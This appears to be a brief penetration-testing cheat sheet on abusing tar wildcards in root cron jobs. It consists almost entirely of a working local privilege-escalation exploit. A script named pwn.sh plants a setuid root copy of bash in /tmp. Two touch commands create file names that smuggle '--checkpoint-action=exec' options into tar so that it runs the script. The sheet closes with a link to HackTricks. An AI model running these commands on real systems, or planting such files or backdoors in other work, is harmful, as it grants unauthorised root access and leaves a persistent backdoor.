# cron Wildcard Abuse

**pwn.sh**

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```

```bash
# Exploiting tar
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh pwn.sh"
```

See [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks) for additional examples.
